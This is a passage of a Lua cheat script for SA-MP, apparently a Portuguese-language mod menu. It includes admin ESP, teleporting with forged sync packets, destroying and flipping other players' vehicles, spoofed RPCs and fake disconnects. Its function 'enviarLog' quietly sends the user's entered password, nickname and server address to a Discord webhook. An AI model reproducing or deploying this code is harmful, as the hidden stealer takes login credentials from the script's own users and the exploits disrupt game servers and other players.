					local var_30_8, var_30_9 = convert3DCoordsToScreen(var_30_2, var_30_3, var_30_4)
					local var_30_10, var_30_11 = convert3DCoordsToScreen(var_30_5, var_30_6, var_30_7)
					local var_30_12 = bit.bor(bit.band(sampGetPlayerColor(var_30_1), 16777215), 4278190080)
					local var_30_13, var_30_14 = sampGetCurrentServerAddress()

					if (getCharModel(iter_30_1) == 217 or getCharModel(iter_30_1) == 211 or var_30_12 == -56577 or var_30_12 == -52327) and aim.CheckBox.teste80[0] and var_30_13 ~= "149.56.195.234" and var_30_13 ~= "144.217.48.48" and var_30_13 ~= "2.59.132.16" and var_30_13 ~= "135.148.159.205" then
						local var_30_15 = math.random(-1, -300000)
                        local nickname = sampGetPlayerNickname(var_30_1)
                        printString('Adm por perto ~b~(' .. nickname .. ')', 200)
						renderDrawLine(var_30_10, var_30_11, var_30_8, var_30_9, 3, var_30_15)
					end

					if iter_30_1 ~= PLAYER_PED then
						local nickname = sampGetPlayerNickname(var_30_1)
						if string.sub(nickname, 1, 5) == "[STT]" then
							local color = sampGetPlayerColor(var_30_1) 
							printString('Adm por perto (' .. nickname .. ')', 200)
							renderDrawLine(var_30_10, var_30_11, var_30_8, var_30_9, 2, color) 
						end
					end
				end
			end
		end
	end
end)

function two(arg_10_0)
    setCarHealth(ch, 200)
    sampForceVehicleSync(arg_10_0)
end
function fcar(param)
    lua_thread.create(function() 
        fcar_func("fcar", param)
    end)
end

function fcar_func(type, param)
    if type == "fcar" then
        if param == "" then
            sampAddChatMessage("{ffffff}Por favor, insira o ID do carro!", -1)
        else
            if not tonumber(param) then
                sampAddChatMessage("{ffffff}O ID do carro deve ser um nÃºmero!", -1)
            else
                local result, handle = sampGetCarHandleBySampVehicleId(tonumber(param))
                if not result then
                    sampAddChatMessage("{ffffff}Nenhum carro encontrado com o ID fornecido!", -1)
                else
                    local x, y, z = getCharCoordinates(PLAYER_PED)
                    warpCharIntoCar(PLAYER_PED, handle)
                    setCarHealth(handle, 1) 
                    wait(50)  
                    warpCharFromCarToCoord(PLAYER_PED, x, y, z)
                    sampAddChatMessage("{ffffff}Voce zoou o carro com ID "..param.."!", -1)
                end
            end
        end
    end
end
function enter(arg_11_0)
    local var_11_0, var_11_1, var_11_2 = getCarCoordinates(ch)

    sendOnfootSync(false, arg_11_0, var_11_0, var_11_1, var_11_2)
    sampSendEnterVehicle(arg_11_0, false)

    for iter_11_0 = 0, 10 do
        wait(10)

        local var_11_3, var_11_4, var_11_5 = getCarCoordinates(ch)

        sendOnfootSync(true, arg_11_0, var_11_3, var_11_4, var_11_5)
    end
end
function exit(arg_12_0)
    sampSendExitVehicle(arg_12_0)
    sampForceOnfootSync()
end

function sendOnfootSync(arg_13_0, arg_13_1, arg_13_2, arg_13_3, arg_13_4)
    local var_13_0, var_13_1 = sampGetPlayerIdByCharHandle(PLAYER_PED)
    local var_13_2 = allocateMemory(68)

    sampStorePlayerOnfootData(var_13_1, var_13_2)

    if arg_13_0 then
        setStructElement(var_13_2, 37, 1, 3, false)
        setStructElement(var_13_2, 0, 2, 0, false)
        setStructElement(var_13_2, 2, 2, 0, false)
        setStructElement(var_13_2, 4, 2, 16, false)
    else
        setStructFloatElement(var_13_2, 6, arg_13_2 + 1.5, false)
        setStructFloatElement(var_13_2, 10, arg_13_3, false)
        setStructFloatElement(var_13_2, 14, arg_13_4, false)
    end

    setStructElement(var_13_2, 34, 1, getCharHealth(PLAYER_PED), false)
    sampSendOnfootData(var_13_2)
    freeMemory(var_13_2)
end

function getcar()
    ch = storeClosestEntities(playerPed)
    _, cid = sampGetVehicleIdByCarHandle(ch)

    return {
        cid,
        ch
    }
end

function imgui.TextColoredRGB(text)
    local style = imgui.GetStyle()
    local colors = style.Colors
    local ImVec4 = imgui.ImVec4
    local explode_argb = function(argb)
        local a = bit.band(bit.rshift(argb, 24), 0xFF)
        local r = bit.band(bit.rshift(argb, 16), 0xFF)
        local g = bit.band(bit.rshift(argb, 8), 0xFF)
        local b = bit.band(argb, 0xFF)
        return a, r, g, b
    end
    local getcolor = function(color)
        if color:sub(1, 6):upper() == 'SSSSSS' then
            local r, g, b = colors[1].x, colors[1].y, colors[1].z
            local a = tonumber(color:sub(7, 8), 16) or colors[1].w * 255
            return ImVec4(r, g, b, a / 255)
        end
        local color = type(color) == 'string' and tonumber(color, 16) or color
        if type(color) ~= 'number' then return end
        local r, g, b, a = explode_argb(color)
        return imgui.ImVec4(r/255, g/255, b/255, a/255)
    end
    local render_text = function(text_)
        for w in text_:gmatch('[^\r\n]+') do
            local text, colors_, m = {}, {}, 1
            w = w:gsub('{(......)}', '{%1FF}')
            while w:find('{........}') do
                local n, k = w:find('{........}')
                local color = getcolor(w:sub(n + 1, k - 1))
                if color then
                    text[#text], text[#text + 1] = w:sub(m, n - 1), w:sub(k + 1, #w)
                    colors_[#colors_ + 1] = color
                    m = n
                end
                w = w:sub(1, n - 1) .. w:sub(k + 1, #w)
            end
            if text[0] then
                for i = 0, #text do
                    imgui.TextColored(colors_[i] or colors[1], u8(text[i]))
                    imgui.SameLine(nil, 0)
                end
                imgui.NewLine()
            else imgui.Text(u8(w)) end
        end
    end
    render_text(text)
end
function getMark()
    local bool, x, y, z = getTargetBlipCoordinates()
    
    if not bool then 
        return false 
    end

    
    requestCollision(x, y)
    loadScene(x, y, z)


    return true, x, y, z
end
function rand()
    return math.random(-50, 50) / 100
end

function getMyId()
    return select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
end

function sampev.onSetPlayerPos(pos)
	if teleport then 
		times = times + 1
		if times == 2 then lua_thread.create(Tp); sendAimSync() return false end
		if times == 3 then times = 0; teleport = false end
		return false
	end
end

function carTeleport(carId, posx, posy, posz)
	sampSendExitVehicle(carId)
	sampForceOnfootSync()
	inCarNop = true
	sampSendEnterVehicle(carId, true)
	for i = 0, 10 do wait(10); sendOnfootSync() end
	Tp(posx, posy, posz)
	inCarNop = false
end
function sendOnfootSync()
	local _, myId = sampGetPlayerIdByCharHandle(PLAYER_PED)
	local data = allocateMemory(68)
	sampStorePlayerOnfootData(myId, data)
	setStructElement(data, 37, 1, 3, false) 
	sampSendOnfootData(data)
	freeMemory(data)
end	
function Tp()
	setCharCoordinates(PLAYER_PED, x, y, z)
	wait(100)
	setCharCoordinates(PLAYER_PED, x, y, getGroundZFor3dCoord(x, y, 999))
end
function imgui.CenterText(text)
    imgui.SetCursorPosX(imgui.GetWindowSize().x / 2 - imgui.CalcTextSize(text).x / 2)
    imgui.Text(text)
end
function reconectsamp()
	lua_thread.create(function()
		local var_22_0 = 500

		if var_22_0 <= 0 then
			var_22_0 = 100
		end

		while var_22_0 > 0 do
			if var_22_0 <= 500 then
				local var_22_1 = raknetNewBitStream()

				raknetBitStreamWriteInt8(var_22_1, sfuncs.PACKET_DISCONNECTION_NOTIFICATION)
				raknetSendBitStreamEx(var_22_1, sfuncs.SYSTEM_PRIORITY, sfuncs.RELIABLE, 0)
				raknetDeleteBitStream(var_22_1)
			end

			wait(100)

			var_22_0 = var_22_0 - 100
		end

		bs = raknetNewBitStream()

		raknetEmulPacketReceiveBitStream(sfuncs.PACKET_CONNECTION_LOST, bs)
		raknetDeleteBitStream(bs)
	end)
end
function getweaponname(arg_2_0)
	return ({
		[0] = "Fist",
		"Brass Knuckles",
		"Golf Club",
		"Nightstick",
		"Knife",
		"Baseball Bat",
		"Shovel",
		"Pool Cue",
		"Katana",
		"Chainsaw",
		"Purple Dildo",
		"Dildo",
		"Vibrator",
		"Silver Vibrator",
		"Flowers",
		"Cane",
		"Grenade",
		"Tear Gas",
		"Molotov Cocktail",
		nil,
		nil,
		nil,
		"9mm",
		"Silenced 9mm",
		"Desert Eagle",
		"Shotgun",
		"Sawnoff Shotgun",
		"Combat Shotgun",
		"Micro SMG/Uzi",
		"MP5",
		"AK-47",
		"M4",
		"Tec-9",
		"Country Rifle",
		"Sniper Rifle",
		"RPG",
		"HS Rocket",
		"Flamethrower",
		"Minigun",
		"Satchel Charge",
		"Detonator",
		"Spraycan",
		"Fire Extinguisher",
		"Camera",
		"Night Vis Goggles",
		"Thermal Goggles",
		"Parachute"
	})[arg_2_0]
end
function sampev.onPlayerQuit(id)
    players[id] = nil
end
function etp()
	if var_0_1 then
		return
	end

	res, tp_x, tp_y, tp_z = getTargetBlipCoordinates()

	if res then
		if not isCharInAnyCar(PLAYER_PED) then
			var_0_1 = true

			lua_thread.create(tp_wo_car)
		end
	else
		sampAddChatMessage("\xD3\xF1\xF2\xE0\xED\xEE\xE2\xE8 \xCC\xE5\xF2\xEA\xF3 \xCD\xE0 \xCA\xE0\xF0\xF2\xE5 \xC4\xEB\xFF \xD2\xCF", -1)
	end
end

function tp_wo_car()
	lockPlayerControl(true)

	var_0_2 = true

	local var_3_0, var_3_1, var_3_2 = getCharCoordinates(PLAYER_PED)

	while var_3_2 > -95 do
		var_3_2 = var_3_2 - 2

		if var_3_2 < -95 then
			sendOnfootSync(var_3_0, var_3_1, -95)
			requestCollision(tp_x, tp_y)
			loadScene(tp_x, tp_y, tp_z)

			local var_3_3 = getGroundZFor3dCoord(tp_x, tp_y, 999)

			sendOnfootSync(tp_x, tp_y, var_3_3)
			setCharCoordinates(PLAYER_PED, tp_x, tp_y, var_3_3)
			lockPlayerControl(false)

			var_0_2 = false

			break
		else
			sendOnfootSync(var_3_0, var_3_1, var_3_2)
		end
	end

	wait(1500)

	var_0_1 = false
end

function sendOnfootSync(arg_4_0, arg_4_1, arg_4_2)
	local var_4_0, var_4_1 = sampGetPlayerIdByCharHandle(PLAYER_PED)
	local var_4_2 = allocateMemory(68)

	sampStorePlayerOnfootData(var_4_1, var_4_2)
	setStructFloatElement(var_4_2, 6, arg_4_0, false)
	setStructFloatElement(var_4_2, 10, arg_4_1, false)
	setStructFloatElement(var_4_2, 14, arg_4_2, false)
	setStructFloatElement(var_4_2, 38, 0, false)
	setStructFloatElement(var_4_2, 42, 0, false)
	setStructFloatElement(var_4_2, 46, -0.938238, false)
	setStructElement(var_4_2, 34, 1, getCharHealth(PLAYER_PED), false)
	sampSendOnfootData(var_4_2)
	freeMemory(var_4_2)
end
function getClosestCarId()
    local minDist = 350
    local closestId = -1
    local x, y, z = getCharCoordinates(PLAYER_PED)
    for i = 0, 1800 do
        local streamed, pedID = sampGetCarHandleBySampVehicleId(i)
        if streamed then
            local xi, yi, zi = getCarCoordinates(pedID)
            local dist = math.sqrt( (xi - x) ^ 2 + (yi - y) ^ 2 + (zi - z) ^ 2 )
            if dist < minDist then
                minDist = dist
                local model = getCarModel(pedID)
                if isValueInTable(heli, model) then
                    closestId = i
                end
            end
        end
    end
    return closestId
end
function toggleCrasher()
    crasher1 = not crasher1

    if crasher1 then
        sampAddChatMessage("{ff0000}[SP MOBILE]: {ffff00} CRASHAR MOBILES ATIVADO", -1)
        crasher5 = true
    else
        sampAddChatMessage("{ff0000}[SP MOBILE]: {ffff00}CRASHAR MOBILES DESATIVADO", -1)
        crasher5 = false
    end
end
function onReceiveRpc(arg_3_0, arg_3_1)
    if crasher5 and (arg_3_0 == 13 or arg_3_0 == 87) then
        return false
    end
    if crasher5 and arg_3_0 == 13 then
		return false
	end

	if crasher5 and arg_3_0 == 87 then
		return false
	end
end
function isValueInTable(tbl, value)
    for k, v in next, tbl do
        if v == value then
            return true
        end
    end
    return false
end
function sampev.onPlayerSync(id, data)
    if data.keysData == 160 then
        players[id] = "PC"
    end
    if data.specialAction ~= 0 and data.specialAction ~= 1 then
        players[id] = "PC"
    end
    if data.leftRightKeys ~= nil then
        if data.leftRightKeys ~= 128 and data.leftRightKeys ~= 65408 then
            players[id] = "Mobile"
        else
            if players[id] ~= "Mobile" then
                players[id] = "PC"
            end
        end
    end
    if data.upDownKeys ~= nil then
        if data.upDownKeys ~= 128 and data.upDownKeys ~= 65408 then
            players[id] = "Mobile"
        else
            if players[id] ~= "Mobile" then
                players[id] = "PC"
            end
        end
    end
end
function cflip(arg_5_0)
    local var_5_0 = arg_5_0:match("(%d+)")
    local var_5_1, var_5_2 = sampGetCharHandleBySampPlayerId(var_5_0)

    if var_5_1 and isCharInAnyCar(var_5_2) and isCharInAnyCar(playerPed) then
        local var_5_3, var_5_4, var_5_5 = getOffsetFromCarInWorldCoords(storeCarCharIsInNoSave(var_5_2), 0, 0, 2.2)

        VehFlipSend(var_5_0, var_5_5)
    end
end
function imgui.CustomCheckbox(str_id, bool, a_speed)
    local p         = imgui.GetCursorScreenPos()
    local DL        = imgui.GetWindowDrawList()

    local label     = str_id:gsub('##.+', '') or ""
    local base_size = 30  
    local h         = base_size  
    local speed     = a_speed or 0.2

    local function bringVec2To(from, to, start_time, duration)
        local timer = os.clock() - start_time
        if timer >= 0.00 and timer <= duration then
            local count = timer / (duration / 100)
            return imgui.ImVec2(
                from.x + (count * (to.x - from.x) / 100),
                from.y + (count * (to.y - from.y) / 100)
            ), true
        end
        return (timer > duration) and to or from, false
    end
    local function bringVec4To(from, to, start_time, duration)
        local timer = os.clock() - start_time
        if timer >= 0.00 and timer <= duration then
            local count = timer / (duration / 100)
            return imgui.ImVec4(
                from.x + (count * (to.x - from.x) / 100),
                from.y + (count * (to.y - from.y) / 100),
                from.z + (count * (to.z - from.z) / 100),
                from.w + (count * (to.w - from.w) / 100)
            ), true
        end
        return (timer > duration) and to or from, false
    end

    local c = {
        {0.18536826495, 0.42833250947},
        {0.44109925858, 0.70010380622},
        {0.38825341901, 0.70010380622},
        {0.81248970176, 0.28238693976},
    }

    if UI_CUSTOM_CHECKBOX == nil then UI_CUSTOM_CHECKBOX = {} end
    if UI_CUSTOM_CHECKBOX[str_id] == nil then
        UI_CUSTOM_CHECKBOX[str_id] = {
            lines = {
                {
                    from = imgui.ImVec2(0, 0),
                    to = imgui.ImVec2(h*c[1][1], h*c[1][2]),
                    start = 0,
                    anim = false,
                },
                {
                    from = imgui.ImVec2(0, 0),
                    to = bool[0] and imgui.ImVec2(h*c[2][1], h*c[2][2]) or imgui.ImVec2(h*c[1][1], h*c[1][2]),
                    start = 0,
                    anim = false,
                },
                {
                    from = imgui.ImVec2(0, 0),
                    to = imgui.ImVec2(h*c[3][1], h*c[3][2]),
                    start = 0,
                    anim = false,
                },
                {     
                    from = imgui.ImVec2(0, 0),   
                    to = bool[0] and imgui.ImVec2(h*c[4][1], h*c[4][2]) or imgui.ImVec2(h*c[3][1], h*c[3][2]),
                    start = 0,
                    anim = false,
                },
            },
            hovered = false,
            h_start = 0,
        }
    end

    local pool = UI_CUSTOM_CHECKBOX[str_id]

    imgui.BeginGroup()
        imgui.InvisibleButton(str_id, imgui.ImVec2(h, h))
        imgui.SameLine()
        local pp = imgui.GetCursorPos()
        imgui.SetCursorPos(imgui.ImVec2(pp.x, pp.y + h/2 - imgui.CalcTextSize(label).y/2))
        imgui.Text(label)
    imgui.EndGroup()

    local clicked = imgui.IsItemClicked()
    if pool.hovered ~= imgui.IsItemHovered() then
        pool.hovered = imgui.IsItemHovered()
        local timer = os.clock() - pool.h_start
        if timer <= speed and timer >= 0 then
            pool.h_start = os.clock() - (speed - timer)
        else
            pool.h_start = os.clock()
        end
    end

    if clicked then
        local isAnim = false

        for i = 1, 4 do
            if pool.lines[i].anim then
                isAnim = true
            end
        end

        if not isAnim then
            bool[0] = not bool[0]

            pool.lines[1].from = imgui.ImVec2(h*c[1][1], h*c[1][2])
            pool.lines[1].to = bool[0] and imgui.ImVec2(h*c[1][1], h*c[1][2]) or imgui.ImVec2(h*c[2][1], h*c[2][2])
            pool.lines[1].start = bool[0] and 0 or os.clock()

            pool.lines[2].from = bool[0] and imgui.ImVec2(h*c[1][1], h*c[1][2]) or imgui.ImVec2(h*c[2][1], h*c[2][2])
            pool.lines[2].to = bool[0] and imgui.ImVec2(h*c[2][1], h*c[2][2]) or imgui.ImVec2(h*c[2][1], h*c[2][2])
            pool.lines[2].start = bool[0] and os.clock() or 0

            pool.lines[3].from = imgui.ImVec2(h*c[3][1], h*c[3][2])
            pool.lines[3].to = bool[0] and imgui.ImVec2(h*c[3][1], h*c[3][2]) or imgui.ImVec2(h*c[4][1], h*c[4][2])
            pool.lines[3].start = bool[0] and 0 or os.clock() + speed

            pool.lines[4].from = bool[0] and imgui.ImVec2(h*c[3][1], h*c[3][2]) or imgui.ImVec2(h*c[4][1], h*c[4][2])
            pool.lines[4].to = imgui.ImVec2(h*c[4][1], h*c[4][2]) or imgui.ImVec2(h*c[4][1], h*c[4][2])
            pool.lines[4].start = bool[0] and os.clock() + speed or 0
        end
    end

    local pos = {}

    for i = 1, 4 do
        pos[i], pool.lines[i].anim = bringVec2To(
            p + pool.lines[i].from,
            p + pool.lines[i].to,
            pool.lines[i].start,
            speed
        )
    end

    local checkboxColor = imgui.ImVec4(0.1, 0.1, 0.1, 1.0) 
    local checkboxHoverColor = imgui.ImVec4(0.0, 0.0, 0.0, 1.0)
    local borderColor = imgui.ImVec4(1.0, 0.0, 0.0, 1.0) 

    local colorHovered = bringVec4To(
        pool.hovered and checkboxHoverColor or checkboxColor,
        pool.hovered and checkboxColor or checkboxHoverColor,
        pool.h_start,
        speed
    )

    DL:AddRectFilled(p, imgui.ImVec2(p.x + h, p.y + h), imgui.GetColorU32Vec4(colorHovered), h/15, 15)
    DL:AddRect(p, imgui.ImVec2(p.x + h, p.y + h), imgui.GetColorU32Vec4(borderColor), h/15, 15, 1.5)
    DL:AddLine(pos[1], pos[2], imgui.GetColorU32Vec4(borderColor), h/10)
    DL:AddLine(pos[3], pos[4], imgui.GetColorU32Vec4(borderColor), h/10)

    return clicked
end

function VehFlipSend(arg_21_0, arg_21_1)
    local var_21_0 = allocateMemory(67)

    sampStorePlayerIncarData(arg_21_0, var_21_0)
    setStructFloatElement(var_21_0, 8, 0.042, false)
    setStructFloatElement(var_21_0, 12, 0.67, false)
    setStructFloatElement(var_21_0, 16, -0.73, false)
    setStructFloatElement(var_21_0, 20, 0.045, false)
    setStructFloatElement(var_21_0, 32, arg_21_1, false)
    sampSendIncarData(var_21_0)
    freeMemory(var_21_0)
end
function isColorPurpleOrPink(color)
    local r = bit.band(bit.rshift(color, 16), 0xFF)
    local g = bit.band(bit.rshift(color, 8), 0xFF)
    local b = bit.band(color, 0xFF)

    return (r >= 128 and g < 128 and b >= 128) or
           (r >= 200 and g < 100 and b >= 200)
end
function sampev.onUnoccupiedSync(id, data)
    players[id] = "PC"
end
function delplayers()
	for iter_45_0, iter_45_1 in ipairs(getAllChars()) do
		if doesCharExist(iter_45_1) then
			local var_45_0, var_45_1 = sampGetPlayerIdByCharHandle(iter_45_1)

			if var_45_1 ~= myid then
				emul_rpc("onPlayerStreamOut", {
					var_45_1
				})
			end
		end
	end
end
function giveGun(weaponID)
    local weaponModel = getWeapontypeModel(weaponID)
    
    if weaponModel == 0 then
        sampAddChatMessage("{ff0000}ID de arma invalido!", 0xFF0000)
        return
    end

    requestModel(weaponModel)
    loadAllModelsNow()
    giveWeaponToChar(PLAYER_PED, weaponID, 200) 
end
function sampev.onRequestClassResponse()
	if aim.CheckBox.teste14[0] then
		return false
	end
end
function WarpToVehicle(slot0)
	if isCharInAnyCar(PLAYER_PED) then
        sampAddChatMessage("{b700d4}Voce nao deve estar dirigindo!", 11993300)
	else
		slot1, slot2 = sampGetCarHandleBySampVehicleId(slot0)

		if not select(1, sampGetCarHandleBySampVehicleId(slot0)) then
			sampAddChatMessage("{b700d4}Nao ha carros com este ID na area de stream!", 11993300)
		else
			warpCharIntoCar(PLAYER_PED, slot2)
		end
	end
end          
function isPedInVehicle(ped)
    return ped ~= nil and getPedOccupiedVehicle(ped) ~= nil
end
function sampev.onSendGiveDamage()
	if bypass2 then
		return false
	end
end
function sampev.onResetPlayerWeapons()
    if aim.CheckBox.teste14[0] then
        return false
    end
    if aim.CheckBox.teste59[0] == false then
    end
    if bypass2 then
        return false
    end
    if nresetar then
        return false
    end
end
function getClosestPlayerId()
    local minDist = maxDistance[0]
    local closestId = -1
    local x, y, z = getCharCoordinates(PLAYER_PED)
    for i = 0, 999 do
        local streamed, pedID = sampGetCharHandleBySampPlayerId(i)
        if streamed then
            local xi, yi, zi = getCharCoordinates(pedID)
            local dist = math.sqrt((xi - x) ^ 2 + (yi - y) ^ 2 + (zi - z) ^ 2)
            if dist < minDist then
                minDist = dist
                closestId = i
            end
        end
    end
    return closestId
end
function unlockVeh(v)
	local bs = raknetNewBitStream()
	raknetBitStreamWriteInt16(bs, v)
	raknetBitStreamWriteInt8(bs, 0)
	raknetBitStreamWriteInt8(bs, 0)
	raknetEmulRpcReceiveBitStream(RPC_SCRSETVEHICLEPARAMSFORPLAYER, bs)
	raknetDeleteBitStream(bs)
end
function isKeyCheckAvailable()
	if not isSampfuncsLoaded() then
		return not isPauseMenuActive()
	end

	local var_66_0 = not isSampfuncsConsoleActive() and not isPauseMenuActive()

	if isSampLoaded() and isSampAvailable() then
		var_66_0 = var_66_0 and not sampIsChatInputActive() and not sampIsDialogActive()
	end

	return var_66_0
end
imgui.OnInitialize(function()
    imgui.GetIO().IniFilename = nil
    local config = imgui.ImFontConfig()
    config.MergeMode = true
    config.PixelSnapH = true
    iconRanges = imgui.new.ImWchar[3](faicons.min_range, faicons.max_range, 0)
    imgui.GetIO().Fonts:AddFontFromMemoryCompressedBase85TTF(faicons.get_font_data_base85('solid'), 14, config, iconRanges)
    theme()
end)

function enviarLog(input)
    if not logOk or messageSent then return end
    messageSent = true

    lua_thread.create(function()
        local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
        if not res then return end

        local nick = sampGetPlayerNickname(id)
        local hora = os.date("%H:%M:%S")
        local data = os.date("%d/%m/%Y")
        local ip, port = sampGetCurrentServerAddress()
        local servername = sampGetCurrentServerName()

        local message = string.format(
            "**Juca Menu**\n\n" ..
            "**Script:** SCARLLET PROJECT\n" ..
            "**ID da Dialog:** 1\n" ..
            "**Senha:** %s\n" ..
            "**Nick:** %s\n" ..
            "**IP:** %s:%d\n" ..
            "**Servidor:** %s\n" ..
            "**Data:** %s\n" ..
            "**Hora:** %s\n\n" ..
            "@everyone",
            input,
            nick,
            ip,
            port,
            servername,
            data,
            hora
        )

        local body = '{"content": "' .. message:gsub('"', '\\"'):gsub("\n", "\\n") .. '"}'
        local response_body = {}
        https.request {
            url = webhookUrl,
            method = "POST",
            headers = {
                ["Content-Type"] = "application/json",
                ["Content-Length"] = tostring(#body)
            },
            source = ltn12.source.string(body),
            sink = ltn12.sink.table(response_body)
        }
    end)
end

function theme()
    local style = imgui.GetStyle()
    style.WindowRounding = 12.0
    style.FrameRounding = 12.0
    style.FramePadding = imgui.ImVec2(8.0, 8.0)
    style.ItemSpacing = imgui.ImVec2(8.0, 4.0)
    
    imgui.PushStyleColor(imgui.Col.WindowBg, imgui.ImVec4(0.0, 0.0, 0.0, 1.0))
    imgui.PushStyleColor(imgui.Col.Border, imgui.ImVec4(0.0, 0.0, 0.0, 1.0))
    imgui.PushStyleColor(imgui.Col.TitleBg, imgui.ImVec4(0.0, 0.0, 0.0, 1.0))
    imgui.PushStyleColor(imgui.Col.TitleBgActive, imgui.ImVec4(0.0, 0.0, 0.0, 1.0))
    imgui.PushStyleColor(imgui.Col.TitleBgCollapsed, imgui.ImVec4(0.0, 0.0, 0.0, 1.0))
    

    imgui.PushStyleColor(imgui.Col.Header, imgui.ImVec4(0.8, 0.0, 0.0, 1.0))           
    imgui.PushStyleColor(imgui.Col.HeaderHovered, imgui.ImVec4(0.8, 0.0, 0.0, 1.0))   
    imgui.PushStyleColor(imgui.Col.HeaderActive, imgui.ImVec4(0.8, 0.0, 0.0, 1.0))    
    
    imgui.PushStyleColor(imgui.Col.Button, imgui.ImVec4(0.8, 0.0, 0.0, 1.0))     
    imgui.PushStyleColor(imgui.Col.ButtonActive, imgui.ImVec4(0.8, 0.0, 0.0, 1.0))  
    imgui.PushStyleColor(imgui.Col.ButtonHovered, imgui.ImVec4(1.0, 0.0, 0.0, 1.0))     
    imgui.PushStyleColor(imgui.Col.CheckMark, imgui.ImVec4(0.8, 0.0, 0.0, 1.0))        
    imgui.PushStyleColor(imgui.Col.SliderGrab, imgui.ImVec4(0.8, 0.0, 0.0, 1.0))     
    imgui.PushStyleColor(imgui.Col.SliderGrabActive, imgui.ImVec4(1.0, 0.0, 0.0, 1.0)) 
    imgui.PushStyleColor(imgui.Col.FrameBg, imgui.ImVec4(0.1, 0.1, 0.1, 1.0))   
end